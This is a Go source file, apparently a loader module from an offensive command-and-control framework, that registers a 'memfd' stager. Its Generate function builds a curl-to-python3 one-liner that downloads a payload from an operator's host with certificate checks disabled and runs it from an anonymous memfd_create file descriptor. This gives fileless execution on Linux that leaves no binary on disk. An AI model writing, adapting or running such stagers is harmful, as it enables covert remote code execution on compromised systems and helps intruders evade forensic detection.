package loader

import "fmt"

type memfdLoader struct{}

func init() { Register(&memfdLoader{}) }

func (m *memfdLoader) Name() string        { return "memfd" }
func (m *memfdLoader) Description() string { return "curl + memfd_create fileless execution" }
func (m *memfdLoader) RequiresTool() string { return "curl,python3" }

func (m *memfdLoader) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (m *memfdLoader) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	return fmt.Sprintf(
		`curl -sk https://%s:%s/p/%s|python3 -c "import ctypes,os,sys;l=ctypes.CDLL(None);l.memfd_create.restype=ctypes.c_int;fd=l.memfd_create(b'',1);d=sys.stdin.buffer.read();os.write(fd,d);os.execve('/proc/self/fd/%%d'%%fd,[''],dict(os.environ))"`,
		opts.Host, opts.Port, opts.Token,
	), nil
}
